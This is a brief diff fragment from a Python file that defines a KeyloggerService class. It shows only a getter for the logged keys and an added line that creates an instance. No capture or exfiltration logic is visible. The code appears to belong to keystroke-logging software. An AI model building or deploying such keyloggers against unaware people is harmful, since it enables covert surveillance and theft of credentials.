@@ -26,4 +26,4 @@ class KeyloggerService(IKeyLogger):
     def get_logged_keys(self) -> List[str]:
         return self.logged_keys
 
-
+service = KeyloggerService()
